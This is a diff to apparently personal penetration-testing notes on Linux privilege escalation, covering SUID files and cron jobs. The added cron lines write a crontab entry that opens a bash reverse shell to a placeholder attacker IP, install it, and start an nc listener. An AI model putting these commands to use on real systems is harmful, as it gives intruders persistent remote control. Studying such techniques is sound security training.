@@ -118,11 +118,13 @@ find / -perm -u=s -type f 2>/dev/null` this will list all the suid files
 ### Cron jobs:
 - Crons jobs are used for scheduling! Here we can schedule any binary/process to run.
 - Interesting part here is that by default they run with the owner privileges.
-- But if we find any cron-job which we can edit then we can do a lot!
-- Cron job config is stored as **crontabs**
-- To view crontab, `cat /etc/crontab`
 - Any one can view it!
-- Now we'll can see some cron-jobs see whether you can edit or not, if you can then edit with some reverse shell and listen!
+- To view crontab, `cat /etc/crontab`
+- `cat /etc/cron*`
+  - `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1'" > backdoor`
+  - `crontab -i backdoor`
+  - `crontab -l`
+- `nc -nlvp 1234`
 
 -------------------
 ### PATH:
